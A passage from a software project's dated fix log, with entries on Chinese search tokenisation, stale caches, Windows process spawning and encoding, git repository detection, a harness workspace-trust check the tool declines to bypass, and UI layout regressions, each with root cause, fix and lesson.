with no path to a second look. `useRepositories` sets no `staleTime` and no interval, and the
driver tick — the page's one heartbeat for *"the world may have changed"* — invalidated sessions,
quests and the driver, and not the index. Pressing *refresh index* refetched it (555 · 7 →
1,051 · 17 in one second), which is how the theory was confirmed and also why nobody would have
found it: the fix for the symptom is the button beside it.

**Fix.** `DRIVER_TICK` invalidates `keys.allRepositories` too (`ShellSignals.tsx`). One line, and
the existing tick test lists the key with the others.

**Verify.** The tick test extended. On the deployed application, the honest way: the page had cached
*1,051 · 17*; a re-index was triggered over the API, not the button (a new fix-log entry made it
1,052); **ten seconds later the bar read 1,052 · 17**, on the driver's tick, with nothing pressed.

**The trap to inherit.** 🔴 **A count taken during a rebuild is a snapshot of the rebuild.** Any
cache of a summary needs a refetch path that fires without a person, or the first partial answer is
the answer for as long as the window stays open.

**Commit.** `e3df788`

## Every Chinese query returned the whole corpus — 中文 search had never worked (2026-09-23)

**Symptom.** On the deployed application's real index, `记录` and `会话` each returned **41 hits in
the same order, the rules TEMPLATE first, the term in no excerpt** — indistinguishable from each
other and from any other Chinese query. `encoding` returned 26 with the term in 17 excerpts. The
platform ships 简体中文.

**Root cause, in two layers.** `Text.Tokenize` drops any token of two characters or fewer — right for
*of* and *a*, wrong for a script in which two characters is a whole word. A Chinese query therefore
produced **no terms**, and `SqliteKnowledgeSearch` treats no terms as the browse an *empty* query
gets: `SELECT … ORDER BY repository, title`. Every Chinese query was that browse. Clearing the floor
exposed the layer beneath: FTS5's `unicode61` tokenizer **keeps a run of ideographs as one token** —
there are no spaces between words in 中文 — so `每个会话都留下一份记录` was indexed whole and a
phrase query for `记录` matched nothing inside it. With the floor fixed alone, every Chinese query
would have returned *nothing*, which is the same defect in a quieter coat.

🔴 **Neither layer can show itself on a fixture.** The fixture has no Chinese prose, and the platform's
own Playwright suite proves the *interface* speaks 中文, which is a different claim from the *index*
finding it. The test that caught it was written for the excerpt marker in the view, in the other
language — it failed on the two-character floor, the same floor was then found in the service, and
the service's test cleared it and returned empty instead of wrong.

**Fix.** `Text.Segment`: every run of ideographs is cut into its overlapping two-character bigrams,
space-separated — the standard answer to CJK search without a dictionary; index and query are cut
the same way so they meet. Applied to the FTS row at write time (`SqliteKnowledgeStore`, schema **3**,
so every existing index rebuilds on open) and inside `Tokenize` (so lexical scoring, the MATCH
builder and excerpt terms all use the same units); never to the stored body, which an excerpt and
the Reader read as written. `Tokenize`'s floor keeps a token in a short-word script whatever its
length. Bigrams of one query are joined with OR like every other term, so a three-character word
ranks documents holding both bigrams above those holding one.

**Verify.** Watched failing twice — browse (*"contained 2 items"*), then empty (*"collection was
empty"*) — then service 274, with nine tests on the segmenter and the tokeniser. On the deployed
application after the rebuild: `中文` → **23 hits, the term in all 23 excerpts, and exactly 23 of
974 indexed entries contain it**; `委托` → 1, centred; `简体中文` → 24, with the full term in 5 and a
bigram in the rest. `记录` → 0, and **0 of 974 entries contain it** — the 114 family files that do
are not indexed kinds. Before: 41, 41, and 41.

**The trap to inherit.** 🔴 **"No usable terms" is not the same as "no query".** A fallthrough to
browse is right for an empty box and catastrophic for a query the tokeniser silently emptied —
because the result looks like success. And a text index is only as multilingual as its tokenizer:
`unicode61` is not a CJK segmenter, and nothing about a green English suite says otherwise.

**Commit.** `7faa2de`

## The sessions frame said "nothing" over four real session records (2026-09-23)

**Symptom.** The Work frame — the frame whose subject is sessions — opened on the deployed
application with four sentences saying there was nothing: *Nothing is running*, *Nothing attended*,
*Choose a session in the rail…*, *Attend a session and its console streams here.* The machine held
four session records from the first deployment's driven runs, each with a transcript on disk.

**Root cause.** The rail fetched closed records (`includeClosed: true`) and then filtered to
`SESSION_ACTIVE` states, keeping a closed one only if it was **already selected** — so a session
that ended while you watched stayed listed, and one that ended before the window opened was
reachable exactly never. The test that held this in place asserted a finished record was absent and
*"left to the views that review them"*; no such view existed. The rail was the only door to a
session.

🔴 **It contradicted the design it was built from.** Working-surface design §7: *"after a restart the
records are the service's and the transcripts are on disk … read when a surface next opens."* The
fixture never showed it because the fixture has one parked conversation and nothing that has ever
ended.

**Fix.** `partition` (`rail.ts`): live sessions grouped by repository as before; beneath them an
**ended** section, newest first, capped at twelve with the remainder counted. No repository headers
there — those carry live facts (drivable, held, which tree is busy) an ended session has none of.
The full empty state appears only when both lists are empty; a machine with no live session but a
record to read gets a one-line *Nothing is running* above the records rather than a panel saying
the records are nothing. The attended-stays-listed rule is untouched.

**Verify.** Six tests on the partition and three on the rail, including the rewritten one. On the
deployed application: the four runs listed as `failed 1m · failed 9m · stopped 2m · failed 7m` —
the case study's own table — and choosing one opens its record. Web 472 + 14 Playwright.

**The trap to inherit.** 🔴 **An empty state rendered over existing records is a misreading, not an
absence.** Any list that filters to "live" needs to answer what happens to the rest, and "some
other view" is not an answer until that view exists.

**Commit.** `39503dd`

## A 990-character template was "substantially the same words" as a 326 KB document (2026-09-23)

**Symptom.** The Convergence view — the knowledge half's lead view — opened on the first real index
with a group at similarity **1.000** holding a rules `TEMPLATE`, a `dev-conventions` rule and a
`pitfalls` knowledge document from three repositories, and the sentence *"A copy that has drifted."*
Thirteen of the forty-eight groups were that shape.

**Root cause.** Restatement scores **containment over token sets, normalised by the smaller set**:
`|A ∩ B| / min(|A|, |B|)`. That was a deliberate choice, so a copy that grew a paragraph still
scores — and it has a failure mode nothing in a fixture can show. A short document made of common
words (*rule*, *why*, *reason*, *apply*, *sessions*) has a vocabulary any long document covers
entirely, so it is "fully contained" in every tome on the index. The fixture's longest entry is a
paragraph; the real index has 100 KB and 326 KB documents, and against those a template scores 1.0
with anything.

🔴 **Measured before it was fixed**, across every group on the real index: the 13 false groups all
had a vocabulary ratio (smaller ÷ larger) at or below **0.09**; the 35 genuine ones — every one the
same file in two repositories — were all at or above **0.46**. Nothing sat between. That gap is what
made the fix a number rather than a heuristic.

**Fix.** `Comparable(a, b)`: the smaller vocabulary must be at least **0.25** of the larger before
containment is consulted at all (`RestatementSizeFloor`, `ConvergenceDetector.cs`). A copy may
grow fourfold and still be found; a template against a tome is not compared. Two tests: the
pathology, reproduced as a template inside a document of ten times its vocabulary, and the case the
guard was written beside — a copy that grew by a paragraph is still a restatement.

**Verify.** Watched failing first (`Assert.Empty() Failure: Collection was not empty`), then service
264. On the deployed application: **36 groups, none below 0.25, minimum 0.463**, and the lead group
is two identical templates in two repositories — which *is* a copy. Query time unchanged (4.1 s).

**The trap to inherit.** 🔴 **A similarity normalised by the smaller side needs a size floor, or every
small generic thing matches every large thing.** The same shape as Jaccard-versus-containment
arguments everywhere; what makes it a trap is that it is invisible until the corpus has both a very
short and a very long document, which a fixture never does.

**Commit.** `9fd67b1`

## Adding a tooltip broke stories that had nothing to do with it (2026-09-22)

**Symptom.** Giving a component a `Tip` turned unrelated stories red — *"`Tooltip` must be used
within `TooltipProvider`"* — from `stories.test.tsx`, which renders every story as a smoke test.
Twice in one session: the status bar's items, then the toast's clamped text.

**Root cause.** `composeStories` applies each story's **own** decorators and the project
annotations it has been given — and it had been given none. So `.storybook/preview`'s globals never
reached the test, and the provider the application mounts once in `main.tsx` was absent for every
story. Both times the apparent fix was "wrap this story", which is the wrong fix twice: the suite
exists to render *what a reviewer sees*, and it was rendering something slightly different.

🔴 **The suite was right and its harness was wrong**, which is the awkward case — a green story in
Storybook and a red one in the test look like a flaky test rather than a missing global.

**Fix.** The provider becomes a project decorator in `.storybook/preview.tsx`, and
`src/test/setup.tsx` calls `setProjectAnnotations(preview)` so `composeStories` renders through it.
Both files gained a `.tsx` extension to carry the JSX.

**Verify.** `npx vitest run src/stories.test.tsx` — 96 stories, including the two that had been
wrapped by hand, with the hand-wrapping no longer load-bearing. The next component to gain a `Tip`
needs nothing.

**Commit.** `c58591a`

## A re-published install kept every bundle it had ever served (2026-09-22)

**Symptom.** Listing a deployed install's `wwwroot/assets` showed **seven** hashed JS bundles. It
produced a wrong answer about which build was live — twice: once in the first-deployment case study,
and once while re-publishing to that same machine afterwards, by the session that had read the case
study warning about it an hour earlier.

**Root cause.** `dotnet publish` does not clear its output directory, so `desktop-publish.mjs`
published the HTTP host *over* the previous one and every earlier hashed bundle stayed. Nothing is
actually broken by this — `index.html` names the current bundle and the host serves it — which is
why it survived: the folder is **correct and unreadable**, and the only thing it costs is the
judgement of whoever reads it.

🔴 **The sibling had already fixed it.** `service-publish.mjs` does `rmSync` then copy, with a
comment naming this exact failure: *"actively misleading to anybody trying to tell which build is
live by listing the folder. That is exactly how a stale deployment was diagnosed the slow way once."*
Two scripts doing one job, one of which learned. That is the counterpart-set shape this repository
keeps meeting — the install layout vs the locator's candidates (2a), the declared gates vs the
workflow, the toolchain twins — and it is the reason the fix is a gate rather than a second comment.

**Fix.** `rmSync(host, { recursive: true, force: true })` before the host publish in
`desktop-publish.mjs`, mirroring its sibling.

**Verify.** `npm run rehearse:deploy` seeds a decoy bundle into a published install, re-publishes
into it, and asserts the decoy is gone and that `index.html` names a bundle the install actually has
— watched failing first (`index-STALEBUNDLE.js, index-yAgtBJUV.js`), then 32/32. The machine's own
install went from seven bundles to one on the next publish.

**Commit.** `f873d16`

## Three real driven runs failed on a flag the repository could not set (2026-09-22)

**Symptom.** A driven session did the work — source, tests, decision records — and then recorded
`failed — exited without touching its quest`, three times, nine minutes and a real login each. The
repository's `.claude/settings.json` allowed exactly the tools it needed.

**Root cause.** The harness said it on the transcript's first line: *"Ignoring 9 permissions.allow
entries from .claude/settings.json: this workspace has not been trusted."* Claude Code ignores a
repository's allow-list until a **person** has accepted that path, recorded per-path in the harness's
own config under the profile — not in the repository, and not anywhere Daoris may write. So the chain
was: driver instructs the session to claim its quest → ACP4 makes the tools reachable → the
repository allows them → the harness drops the allow-list unread.

🔴 **Why it had never been seen.** DRV4's scratch repository had been opened by hand during that
session, and its archive entry names the dependency in a parenthetical — *"its own
`.claude/settings.local.json` trusting it"*. The claim it confirmed is true **given a trusted
workspace**, and that qualifier lived in one clause nobody was reading as a precondition.

**Fix.** `ClaudeTrust` reads the record and the driver **holds** before spawning, naming the path, the
one command, and what it costs. Not written — that flag is the person's grant, and a tool that set it
on their behalf would remove the only step in the chain that was theirs. Declared per harness
(`HarnessToolchain.TrustFile`), so a harness with no notion of trust is unaffected.

**Verify.** Eleven tests, including the case that actually bit: a path the harness has never recorded
is **untrusted, not unknown**, because it prompts on first visit. Then against the real tree — the
driver held with the sentence instead of spawning.

**The trap to inherit.** 🔴 **Only a definite NO refuses**, and absent is not always unknown: for a
login the harness cannot answer, absent means unknown and is permissive; for a trust prompt that
appears on first visit, absent means never-accepted and is a definite no. Two absences, opposite
readings, and the difference is whether the thing records its own negatives.

**Commit.** `7ff0e04`.

## A session transcript was decoded as the machine's ANSI codepage (2026-09-22)

**Symptom.** The first real driven run's transcript held `鈥?` where every em-dash belonged. Raw
bytes: `e9 88 a5 3f`, where the session had written `e2 80 94`.

**Root cause.** `e2 80 94` read as **CP936** is `鈥` + an unmappable byte, and that is what got
re-encoded to UTF-8 on the way to the file. .NET defaults a redirected stream to the **console's**
codepage, and nothing in `Spawning` set `StandardOutputEncoding`. On an English machine the default
is close enough to ASCII that a transcript looks right; on this one it is not.

🔴 **The failure is silent and permanent.** The file afterwards is valid UTF-8, so nothing downstream
can tell it was ever wrong — no parse fails, no gate trips, and the original bytes are gone. And it is
worse than a mangled dash: this platform ships **简体中文**, so a transcript that cannot carry a dash
carries no Chinese at all.

**Fix.** `StandardOutputEncoding` and `StandardErrorEncoding` set to UTF-8 in `Spawning.Shell` — the
one place every adapter goes through, which matters because the **protocol door parses JSON-RPC off
the same stream**, so this was never only a cosmetic problem.

**Verify.** A theory over all six adapters in `Acp3AdapterTests`, watched failing on every one first.

**The trap to inherit.** 🔴 **Redirecting a stream chooses an encoding whether you say so or not.**
Anything that reads another program's output states UTF-8 explicitly — and the check belongs on the
`ProcessStartInfo`, not on the text, because by the time the text is wrong it is indistinguishable
from text that was always that way.

**Commit.** `bd19905`.

## The shell looked for the installed HTTP host where the installer never puts it (2026-09-22)

**Symptom.** None, on any developer machine — which is the whole entry. A machine with the service
correctly installed (`npm run publish:service -- --install`) still had `ServiceHostLocator` fail to
find its HTTP host, and the shell silently fell through to the **workspace build** instead. Found by
deploying the desktop to a real folder and asking what it would locate from there.

**Root cause.** The installer gives the HTTP host a **directory of its own** —
`~/.daoris/bin/daoris-knowledge-http/daoris-knowledge-http.exe` — because its `wwwroot` bundle has to
travel beside the executable, while the MCP host installs flat as `~/.daoris/bin/daoris-knowledge.exe`.
The locator only ever built the **flat** candidate, for both. The publish script even prints the nested
path on success, so the two halves disagreed in writing and nothing compared them.

🔴 **The fallback is what hid it.** The locator's third candidate is the workspace build, which exists
on every machine this was ever run on, so it always found *a* host and nobody asked which. On a
deployed machine there is no workspace to fall through to and the shell reports no host at all — the
one place the bug is fatal is the one place it had never been run.

**Fix.** `ServiceHostLocator.Candidates` gains the packaged path after the flat one (a hand-placed
binary stays the more deliberate of the two), and a third for the copy a deployed shell carries beside
itself — otherwise `desktop-publish --service` would publish a host nothing looks for, which is a flag
that is a claim nothing reads.

**One test had to change, and its reason is the lesson.** `No_workspace_means_no_dev_candidates_and_no_crash`
asserted `Assert.Single(candidates)`. It said *one* while meaning *nothing from a workspace*, so every
correct new candidate read as a regression. It now asserts the property it was always about.

**Verify.** `dotnet test src/Daoris.Desktop/Daoris.Desktop.Driver.Tests` — 276, with the new case
watched failing (`Assert.NotNull() Failure: Value is null`) against the real installed layout first.

**Commit.** `5e73ce9`.

## A single-line fixture passed the CRLF test the multi-line case fails (2026-09-22)

**Symptom.** `region.ts` had fourteen green tests, including one for CRLF files. Run against a **real**
adopter's `AGENTS.md` — 133 CRLF lines — the body written into the region did not read back. Caught
before it landed, and only because the module was driven over real input rather than over a fifteenth
fixture.

**Root cause.** `findRegion` normalised the body with `.join('\n').replace(/\r$/, '')` — one strip, at
the very end. That is correct for a **one-line** body and wrong for every longer one: each interior
line came back still carrying its `\r`. The CRLF test used the body `'the tier'`, so it proved the
file's line endings survived and never proved the body round-tripped.

**Fix.** Strip per line — `.map((line) => line.replace(/\r$/, '')).join('\n')`. The line endings
belong to the **file**, which `writeRegion` preserves by detecting and re-using them; the body is
**content**, which is LF here like everything else. Two more tests: a multi-line body through a CRLF
file, asserting the round trip *and* that re-writing what was read changes nothing; and the refusals
on a CRLF file, because a marker comparison that forgot the `\r` would read every marker in a Windows
checkout as prose and silently append to a damaged region instead of refusing.

**Verify.** 17 tests, and the real file: body round-trips, idempotent, the adopter's bytes are a
byte-for-byte prefix, and the file is still CRLF throughout.

**The trap to inherit.** 🔴 **A fixture with one line proves nothing about line endings.** The bug
lives *between* lines, so any test whose input has no interior line boundary cannot see it — and it
will be green, which is worse than absent. This is the third line-ending assumption in this
repository (D25 was the first; the fixture-vs-real gap is the same shape as `examples/` existing at
all). Anything that reads or writes multi-line text gets a multi-line fixture with the other
platform's endings, and gets run once over a real file before it is called done.

## The presence probe asked about a different binary than the spawn would run (2026-09-22)

**Symptom.** ACP2's driven run refused: *"`claude-code-acp` is not installed on this machine, so there
is nothing to spawn"* — about a harness whose pin `daoris harness list` printed on the very next line,
and which answered `--version` when run by hand. The same roster reported `codex` absent on a machine
with `@openai/codex` installed globally.

**Root cause.** Twin rule 4 — *the binary is the explicit command, then the managed pin, then `PATH`*
(TOOL2/D57) — was implemented where a session **spawns** and not where presence is **decided**. Both
twins probed `toolchain.binary` against `PATH` while resolving the pin separately, so the driver
resolved a binary correctly and then vetoed it on an answer about a different program. The CLI twin
failed the other way round and worse: with a pin set it reported the machine's own `claude` **as the
pinned one** — the silent substitution the pin exists to prevent, arriving through the presence
question instead of through the spawn.

Underneath it, on the Node side only, the second half of the Windows trap from the entry below: `ask()`
still called `spawnSync` directly, so a managed pin's `.cmd` shim could not be probed at all. That is
what hid `codex`. .NET's `Process.Start` runs a `.cmd` with `UseShellExecute = false`, measured — so
the driver never had this half.

**Fix.** Both probes resolve the pin before asking, and both refuse a pin with nothing installed at it
by name rather than falling back to `PATH`. The CLI's `ask()` goes through `spawnable()`, and the login
question is asked of **the same binary the version came from** — asking the pin whether it runs and
then asking `PATH` whether it is logged in answers about two different installs.

**Verify.** Four tests, watched failing first: a pinned harness probes as present *on the pin* and a pin
with nothing behind it probes as absent, in `toolchain.test.ts` and `HarnessTests.cs`. By hand,
`daoris harness list` now reports `claude-code-acp 0.79.0` and `codex codex-cli 0.155.1` where both
said "absent".

**The trap to inherit.** 🔴 **A rule implemented at one of its two call sites is not implemented.**
Resolution and presence are the same question asked twice, and the driver's own code computed both
and compared them without noticing they disagreed. Where a rule decides *which* thing, every predicate
about *that* thing has to be asked of the resolved one — and the fixture has to be honest about it:
this fix broke two selection tests whose managed shim was an empty file, which was true enough while
nothing executed it.

## A scratch host with no root of its own adopts the machine's whole family (2026-09-22)

**Symptom.** ACP2's proof run hung with nothing on screen. Asked directly, the scratch host at
`localhost:5201` answered a registry containing the developer's **neighbouring repositories** — real
sibling projects the run had never heard of, beside a fixture family of two.

**Root cause.** Two defaults, both correct on their own. The host's knowledge root defaults to *the
parent of its workspace* and its index to `~/.daoris/knowledge.db` — which is exactly right for the
machine's own service, whose job is to index the family. The proof script set neither (it passed
`DAORIS_STORE`, which is not a variable anything reads), so a **scratch** host came up pointed at the
**real** family root and the **real** index, read every sibling's `.claude/` documents and decision
logs, and refreshed the machine's shared database with them. Nothing was written into any sibling
repository and nothing left the machine — but a fixture run had reached well outside its fixture.

The hang was separate and made it invisible: every read in the script was a bare `fetch`, which has no
timeout, so a host that accepts a connection and answers slowly stalls the run with no output at all.

**Fix.** `tools/acp2-proof.mjs` now passes `DAORIS_KNOWLEDGE_ROOT`, `DAORIS_KNOWLEDGE_DB` and
`DAORIS_REMOTE_CONFIG` into its scratch directory — the same confinement `tools/family-rehearsal.mjs`
has always applied. Every read goes through a bounded `ask()`. And a **guard** reads the registry back
before a quest is published or a model is spent: a scratch host that can see a repository this run did
not create is pointed at the wrong world, so the run refuses and says which names it found.

**Verify.** `node tools/acp2-proof.mjs --drive` reports *"the host sees this scratch family and
nothing else"*, and its registry holds only `proof-asker` and `proof-repo`.

**The trap to inherit.** **A default that is right for the product is wrong for a fixture**, and it
fails silently in the one direction nobody checks — outwards. Anything that spawns the service for a
test names its root and its store, and then *asserts what it can see*: confinement you set and never
read back is confinement you are hoping for. The guard is the half that matters, because the env
variable was misspelled and a misspelled variable looks exactly like a correct one.

## `daoris harness install` has never worked on Windows (2026-09-22)

**Symptom.** `daoris harness pin claude-code-acp 0.79.0` — TOOL2's new verb, on its first real use —
answered *"`npm` could not be run — spawnSync npm ENOENT"*, on a machine with npm plainly installed.

**Root cause.** Two Windows facts in a row, and `install` and `update` have carried both since they
were written. **`npm` is `npm.cmd`**, and `spawnSync` with `shell: false` does not resolve `PATHEXT`
— so it answers `ENOENT`, which reads as "npm is not installed". Resolve the extension and the second
lands: **Node refuses to spawn a `.cmd` or `.bat` without a shell at all** (the 2024
argument-injection fix, CVE-2024-27980), answering `EINVAL`. Between them, every npm-shaped mechanism
this module declares was broken on Windows — silently, because nobody had run one: the gates never
install a harness, deliberately (D49 §4 keeps install, update and login out of every gate as person
actions).

**Why `shell: true` is the wrong fix, twice.** Node does not quote arguments for it on Windows, so a
configuration home under `C:\Users\<a name with a space>\` breaks; and it would put a version string a person typed
onto a command line `cmd.exe` parses, where the directory-name check that guards a pin does not refuse
`&`.

**Fix.** `spawnable()` in `toolchain.ts`: resolve the shim through `PATHEXT`, and for a `.cmd`/`.bat`
build the `cmd.exe /d /s /c` invocation explicitly with `windowsVerbatimArguments`, quoting every
token itself. A token containing `"`, `%` or a newline is **refused** rather than escaped — every
argument here is a path or a `package@version`, none of which legitimately contains one, and
"escaped correctly for cmd" is a claim nobody should have to verify.

**Verify.** `daoris harness pin claude-code-acp 0.79.0` installs 105 packages into a directory Daoris
owns and records the pin. Run against a scratch `DAORIS_HARNESS_CONFIG`, so the developer's real
`~/.daoris` was untouched.

**The trap to inherit.** **A mechanism no gate runs is a mechanism nobody has run.** These three were
kept out of the gates for a good reason — they install software and spend logins — and the cost of
that decision is that their first real execution is by a person, in anger. Where a gate cannot run
something, the first manual run is the test, and it should happen before the feature is called done
rather than months later.

## `desktop kill` orphaned the host it was supposed to stop (2026-09-22)

**Symptom.** A `npm run desktop -- build` failed with MSB3027 — seven `daoris-knowledge-http`
processes from this checkout's Debug build were holding `Daoris.Service.Core.dll`. They had
accumulated silently over a session of `run`/`kill` cycles.

**Root cause.** `stopAll` closes the shell rather than killing it precisely so the app's own shutdown
path runs — that path is what stops the HTTP host the shell spawned and owns. It used
`Process.CloseMainWindow()`, which closes whichever window **Windows** calls main. **SURF8 made that
not necessarily the application's**: with the monitor open, `CloseMainWindow` closed the *monitor*,
the app kept running, the 8-second wait expired, and `Stop-Process -Force` landed — killing the shell
before it could stop its host. A regression from the commit that introduced secondary windows, found
two commits later by its second-order symptom rather than by the kill itself, which reported success
every time.

**Fix.** Close repeatedly, re-reading `MainWindowHandle` each time: the secondary windows go first,
the main window last, and the app exits on its own terms. Six attempts at 2.5s, then the force kill
as a genuine last resort. `tools/desktop.mjs`.

**Verify.** `run`, open the monitor, `kill`, then `Get-CimInstance Win32_Process` for
`daoris-knowledge-http` — none left from this checkout, and the next `build` succeeds.

**The trap to inherit.** This is the **third** disguise of one fact: `MainWindowHandle` answers for
one window and Windows chooses which. The other two are in the SURF8 entries below. When a change
makes a process multi-window, every caller of that property is a caller that has silently changed
meaning — and the ones that *report success anyway* are the expensive ones.

## A second window opened, and then failed its bring-up on a thread-affine environment (2026-09-22)

**Symptom.** The monitor window (SURF8) opened with its native frame, and its content was one
sentence: *"CoreWebView2Environment members can only be accessed from the UI thread."* The main
window was unaffected, nothing was logged, and the build was green.

**Root cause.** A `CoreWebView2Environment` is **affine to the thread that created it**, and
`SecondaryWindows` runs every window on its **own STA thread with its own message pump** — which is
the whole reason that API exists. The new form was handed the DI-registered
`WebViewEnvironmentOptions` singleton, which is correct, but `WebViewHost` defaults to
`UseSharedEnvironment = true` — the process-wide environment, created by and for the **main UI
thread**. So the first call into it from the window's own thread threw.

**Why nothing caught it.** Nothing could. There is no test in this repository that starts a second
STA pump with a real WebView2 in it, and there will not be: the failure is a property of two real
threads and a real browser process. It was found by opening the window and looking at it, which is
what the standing polish direction is for.

**Fix.** `UseSharedEnvironment = false` on the secondary host's options — the framework's documented
answer, which its own thread-affinity note names for exactly this case. Same options and same
user-data folder, so the two environments still share one browser process; it costs a handle, not a
browser. `src/Daoris.Desktop/Daoris.Desktop.App/SecondaryForm.cs`.

**Verify.** `npm run desktop -- run`, open the monitor from the palette, and the window renders the
platform. Captured in both themes.

**The trap to inherit.** **A "process-wide" singleton is a claim about a thread**, and a framework
that hands out per-thread constructors is telling you so. Before sharing anything into a window with
its own pump, look for the affinity note — this one was written down in the API documentation and was
simply not read before it was needed.

## A secondary window wore the old theme, because `SET_THEME` belongs to exactly one window (2026-09-22)

**Symptom.** With the OS in dark mode the monitor window's page was dark and its **title bar was
light**. The main window was correct in both.

**Root cause.** The main window follows the OS theme by being **told**: the page pushes `SET_THEME`
over `WindowCommandModule`, and the form re-applies the DWM border, the fill and the dark-mode flag.
`WindowCommandModule` targets one form and its module name (`SHENORA.WINDOW`) is **reserved and
singular** — recorded in D55 §b as the reason secondary windows keep their native frame — so a
secondary window's page has no channel to its own frame. The form read the OS theme once, at
construction, and never again.

**Fix.** The secondary window follows the OS **directly**:
`SystemEvents.UserPreferenceChanged` → `ApplyChromeTheme`. Two details that are the whole fix:
marshalled with `BeginInvoke` and never `Invoke`, because the notification arrives on the
system-events thread and a blocking marshal into a window with its own pump is the deadlock the
framework warns about; and unhooked on `FormClosed`, because `SystemEvents` holds a **static**
handler list, so every monitor the person ever opened would otherwise stay alive handling theme
changes.

**Verify.** `npm run desktop -- shot --window monitor --theme dark|light`, both read correctly.

**The trap to inherit.** **When a mechanism is documented as singular, everything downstream of it is
singular too** — and the second instance does not fail, it just quietly stops being updated. Ask what
*tells* a component its state, not only what renders it.

## The dev instruments addressed whichever window Windows called main (2026-09-22)

**Symptom.** With the monitor open, `shot` photographed the **main** window while reporting success,
and `eval` attached to the monitor's page and then refused with *"the page on 9333 is not this
shell"*. Two consecutive `shot` runs with the same windows open returned different windows.

**Root cause.** Both instruments were written when the shell had exactly one window and one page, and
both said so — `shot-window.ps1` used `Process.MainWindowHandle`, which answers for one window chosen
by **Windows**; `pickPageTarget` took the first non-devtools page and carried the comment *"the shell
has exactly one page"*. SURF8 made both false. The `eval` refusal was the identity check working
correctly on the wrong page: the monitor's URL carries `?window=monitor`, which is not the origin the
run recorded.

**Fix.** `--window <monitor|session:ID>` on `shot`, `eval` and `click`. One flag for both layers
though they address different things — `pickPageTarget(targets, window)` matches the page whose URL
carries that `window` parameter (and null means the page with none), while the capture enumerates the
process's visible top-level windows with `EnumWindows` and matches the caption. A name that matches
nothing is **refused**, never a fall back to the main window: the point of asking is that the main
window is not the one wanted. `tools/desktop.mjs`, `tools/cdp.mjs`, `tools/shot-window.ps1`.

**Verify.** `node tools/desktop.mjs eval --window monitor "document.querySelector('h1').textContent"`
answers `"Monitor"` and the same call without the flag answers `"Overview"`.

**The trap to inherit.** **An instrument encodes the shape of the thing it measures**, and when that
shape changes the instrument does not fail — it answers about something else. Both of these carried
the old assumption in a comment, which is the cheapest possible place to have found it and the last
place anybody looks.

## The design language claimed `aria-modal` and no dialog had ever had it (2026-09-22)

**Symptom.** A test written for the new command palette asserted what D41 §6 says every drawer is —
`role="dialog"` **with `aria-modal`** — and got `null`. Not a palette bug: the existing drawer, which
that sentence was written about, had never had the attribute either.

**Root cause.** Radix's `Dialog.Content` writes the role, portals the content, traps focus and handles
ESC — but it does **not** write `aria-modal`. `grep -c aria-modal` in the installed package returns
**0**. The platform relied on the library for something the library never claimed to do, and the
design document asserted it as fact.

**Why nothing caught it.** Nothing reads prose. D41 §6 is a design document, the drawer's own tests
covered its behaviour (opens, closes on ESC, traps focus) and not its ARIA surface, and a missing
`aria-modal` breaks nothing visible — a sighted person notices no difference at all. It is the exact
shape `claims-need-checks` describes: the claim and the enforcement are written at different moments
and only the claim is easy.

**Fix.** Both modal surfaces set `aria-modal="true"` explicitly, and `ui.test.tsx` now asserts it for
each. The test is written as "every modal surface says it is modal" so the next one is caught by the
act of not being listed. Removed the attribute from the drawer and watched the assertion go red before
believing it.

**The trap to inherit.** **A behaviour you get from a library is a claim about the library**, and the
one place it will not be checked is the document that states it most confidently. When prose in a
design record says a component *is* something, the cheap move is to grep the dependency for the thing
before believing it — and the durable one is a test that reads the attribute, because the next
library upgrade is another chance for this to become false silently.

## git walks UP, so a diff of a session tree nearly showed the parent project's work (2026-09-22)

**Symptom.** Caught before it shipped, by a test written in the same hour: `WorkingTree.DiffAsync`
pointed at a directory that is not a git repository returned a **clean exit code and a diff**, where
it was supposed to return null. The test asserted null and went red.

**Root cause.** `git` searches upward for a repository. Run it in any directory that sits inside one
and it answers for the ENCLOSING repository — exit 0, real output, nothing to suggest the answer is
about somewhere else. So a session whose tree had been discarded, or a checkout that was never a
repository, would have produced a diff of whatever project contained it.

**Why that is worse than it sounds here.** The desktop's own example family are plain directories
under this repository's gitignored `_fixtures/`. Opening *Review* on a session in one of them, before
the guard, showed **Daoris's own last commit** — four files from the previous landing — rendered as
what the `engine` session did. Confirmed by hand:
`git rev-parse --show-toplevel` in that session tree answers with the Daoris repository root.

**Fix.** Ask git for `rev-parse --show-toplevel` first and refuse unless it names the path being
diffed. That rejects a non-repository, a deleted tree, and a SUBDIRECTORY of a real repository — the
last of which git would have happily answered by silently narrowing the diff to that subtree. The test
now covers all three, including the plain-directory-inside-a-repository shape that made this real.

**The trap to inherit.** **A process that searches upward has no failure mode you can detect from its
exit code.** git, and every tool like it, will answer a question about somewhere else rather than
refuse — so a command run in a path the caller does not control needs the path CONFIRMED, not just
the exit code checked. And it is the `reaching-in` lesson in read-only form: the damage from reading
the wrong repository is attributing its work to someone who did not do it.

## A responsive rule outlived the thing it was written for, and stacked the icon rail on top of the page (2026-09-22)

**Symptom.** On a browser window under 768px the 48px activity bar became a **48×276 column above the
content**, leaving the page **105px** of height. Found by opening the platform in Chrome and resizing
it — not by any suite.

**Root cause.** `App.tsx`'s layout row carried `max-md:flex-col max-md:overflow-y-auto`. That rule was
written for the **15rem labelled sidebar** (D41 §2: *"the sidebar becomes a top bar — nothing is
hidden behind a hamburger; five items fit"*), and it worked because the sidebar answered it with
`max-md:w-full max-md:flex-row`. SURF10 retired the sidebar and replaced it with a 48px `ActivityBar`
that has **no responsive rules at all** — correctly, since a 48px rail needs none. The container's
half of the old pair stayed, so the stacking still happened and the rail had nothing to answer it
with.

**Why no gate caught it.** vitest has no layout, and every Playwright case ran at the default
viewport. The regression lives **only** at a width nothing measured, which is the same shape as the
tooltip one the day before: a defect in the *geometry of the assembled page*, invisible to a check
that never assembles it at that size.

**Fix.** The rule is gone — one layout at every width, which is also what keeps D55's "a window, not
a page" true on a narrow screen rather than only on a wide one. A Playwright case sets a 680px
viewport and asserts the rail is **beside** the content (`main.x >= bar.right`, same `y`), that it is
still under 60px wide, and that the content keeps its height. Sabotaged by putting the rule back, and
watched fail on the first assertion.

**The trap to inherit.** **A responsive rule is half a pair, and retiring the other half leaves it
pointing at nothing.** When a layout element is replaced by one with different rules, grep the
container for breakpoint classes that were written to cooperate with the old one — they compile, they
render, and they are only wrong at a width nobody opens. And when a suite's cases all run at one
viewport, that viewport is the only one that has ever been tested.

## A tooltip swallowed clicks on the control it described, once that control moved (2026-09-21)

**Symptom.** `npm run test:web` went red on the workspace-scope test, in a landing that changed no
scope code at all: Playwright clicked the `studio` option sixty times over thirty seconds and each
